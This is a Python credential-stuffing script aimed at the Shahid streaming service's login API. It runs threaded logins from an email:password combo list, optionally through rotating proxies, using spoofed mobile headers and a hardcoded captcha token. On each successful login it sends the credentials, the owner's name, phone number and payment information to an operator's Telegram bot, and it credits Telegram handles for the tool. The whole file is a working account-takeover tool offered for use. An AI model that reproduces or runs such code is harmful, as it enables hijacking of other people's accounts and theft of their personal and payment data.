import requests
import json
import os
import time
import threading
ok = 0
cp = 0
bd = 0
G2 = '\x1b[38;5;196m' 
G27 = '\x1b[38;5;121m' 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
m1='\x1b[38;5;196m'
a36 = '\x1b[38;5;228m'
G20 = '\x1b[1;92m\x1b[38;5;212m'
G16 = '\x1b[1;92m\x1b[38;5;208m'
a6 = '\x1b[38;5;5m'
prox2 = False
Gkill = []
def Gprox(prox3):
    global Gkill
    with open(prox3, 'r') as file:
        Gkill = file.read().splitlines()
def prox4():
    return {'http': f'http://{Gkill[ok % len(Gkill)]}', 'https': f'http://{Gkill[ok % len(Gkill)]}'} if prox2 else None
def msg(email, pas):
    global ok, bd, cp
    os.system('clear')
    print(f'{B}?'*40)
    print(f'''{G}[v] Hit : {B}{ok}
{m1}[-] Bad : {a6}{bd}''')
    print(f'{B}?'*40)
    print(f'{S}[+] {B}{email} {S}| {B}{pas}')
    print(f'{B}?'*40)
    print(f'{G2}Demo {G20}- {G27}@N_C_P')
    print(f'{G2}Golden {G20}- {G27}@rrrrrF')
    print(f'{G2}channel {G20}- {G27}@N_9_N_6')
    print(f'{B}?'*40)
def Check(email, pas):
    global ok, bd
    G1 = "https://api2.shahid.net/proxy/v2.1/usersservice/userStatus?country=TN"
    G2 = {
        "Host": "api2.shahid.net",
        "UUID": "web",
        "profile": "{\"id\":\"bdcb6780-ab9e-11ed-95fb-0d7f829f8f56\",\"master\":true,\"ageRestriction\":false}",
        "Accept": "application/json",
        "Accept-Language": "fr",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://shahid.mbc.net",
        "language": "FR",
        "profile-key": "{\"isAdult\":true}",
        "User-Agent": "Shahid/7.35.0.3876 CFNetwork/1390 Darwin/22.0.0 (iPhone/11_Pro iOS/16.0.2) Safari/604.1",
        "Referer": "https://shahid.mbc.net/",
        "x-dtc": 'sn="v_4_srv_12_sn_69D2E5A1BCDC498509E5F25BC0AEE23F", pc="12$23475834_233h26vWKJLUUVHCAEFKTHMHGOCRFCMUMPDCMWU-0e0", v="1676423475840IES4681GMCH9B0M75M2NFP4O5683EPA3", app="a28d789e067b813f", r="https://shahid.mbc.net/fr/widgets/login?mobile=true&enableUpgrade=false&deviceId=099523DD-0A4D-4728-93D5-179110BF8CC9&deviceSerial=099523DD-0A4D-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV"'
    }
    G3 = {
        "username": email,
        "captchaToken": "HG45YgHr%^&Qad$56GhrF4G466Dhy@%^J6&jD789qAft^@yT%^*JhjyfwDD"
    }
    res1 = requests.post(G1, headers=G2, json=G3, proxies=prox4())
    tk = int(time.time())
    G11 = f"https://api2.shahid.net/proxy/v2.1/usersservice/validateLogin?t={tk}&country=TN"
    G22 = {
        "Host": "api2.shahid.net",
        "UUID": "web",
        "profile": "{\"id\":\"bdcb6780-ab9e-11ed-95fb-0d7f829f8f56\",\"master\":true,\"ageRestriction\":false}",
        "Accept": "application/json",
        "Accept-Language": "fr",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://shahid.mbc.net",
        "language": "FR",
        "profile-key": "{\"isAdult\":true}",
        "User-Agent": "Shahid/7.35.0.3876 CFNetwork/1390 Darwin/22.0.0 (iPhone/11_Pro iOS/16.0.2) Safari/604.1",
        "Referer": "https://shahid.mbc.net/",
        "x-dtc": 'sn="v_4_srv_12_sn_69D2E5A1BCDC498509E5F25BC0AEE23F", pc="12$23540062_272h17vWKJLUUVHCAEFKTHMHGOCRFCMUMPDCMWU-0e0", v="1676423475840IES4681GMCH9B0M75M2NFP4O5683EPA3", app="a28d789e067b813f", r="https://shahid.mbc.net/fr/widgets/login-password"'
    }
    G33 = {
        "email": email,
        "rawPassword": pas,
        "subscribeToNewsLetter": False,
        "terms": True,
        "deviceSerial": "",
        "deviceType": "",
        "physicalDeviceType": "",
        "label": "",
        "isNewUser": False,
        "captchaToken": "HG45YgHr%^&Qad$56GhrF4G466Dhy@%^J6&jD789qAft^@yT%^*JhjyfwDD",
        "isEmailVerified": False,
        "isEmailVerifiedZerobounce": False
    }
    res2 = requests.post(G11, headers=G22, json=G33, proxies=prox4()).json()
    if 'success' in res2:
        ok += 1
        msg(email, pas)
        HitG = (f'—————————————————————\n'
                f'- Email - {email}\n'
                f'- Password - {pas}\n'
                f'—————————————————————\n'
                f'firstName : {res2.get("user", {}).get("firstName", "")}\n'
                f'lastName : {res2.get("user", {}).get("lastName", "")}\n'
                f'userName : {res2.get("user", {}).get("userName", "")}\n'
                f'mobileNumber : {res2.get("user", {}).get("mobileNumber", "")}\n'
                f'email : {res2.get("user", {}).get("email", "")}\n'
                f'language : {res2.get("user", {}).get("language", "")}\n'
                f'paymentMethodType : {res2.get("userAdditionalValues", {}).get("paymentInfo", {}).get("paymentMethodType", "")}\n'
                f'paymentInfo : {res2.get("userAdditionalValues", {}).get("paymentInfo", "")}\n'
                f'currentDate : {res2.get("currentDate", "")}\n'
                f'—————————————————————\n'
                f'Demo - @N_C_P\n'
                f'Golden - @rrrrrF\n'
                f'channel - @N_9_N_6\n'
                f'—————————————————————')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=MarkdownV2&disable_web_page_preview=true&text={HitG}")
    else:
        bd += 1
        msg(email, pas)

os.system('clear')
print('Hi pro .')
print(f'{E}?'*40)
ID = input(f'??{G27} - Enter Your ID = > ')
print(f'{E}?'*40)
token = input(f'??{G16} - Enter Your Token = > ')
print(f'{E}?'*40)
path = input(f'{G20}?? - Combo List : {G}')
print(f'{E}?'*40)
prox1 = input(f'{G20}?? - ???? ??????? ???????? ? (y/n) : {G}')
if prox1.lower() == 'y':
    prox2 = True
    prox3 = input(f'{G20}?? - Proxies List : {G}')
    Gprox(prox3)
print(f'{E}?'*40)
threads = []
for whis in open(path, 'r').read().splitlines():
    acc = str(whis)
    acc = acc.split('\n')[0]
    email = acc.split(':')[0]
    pas = acc.split(':')[1]
    thread = threading.Thread(target=Check, args=(email, pas))
    threads.append(thread)
    thread.start()
    time.sleep(4)
for thread in threads:
    thread.join()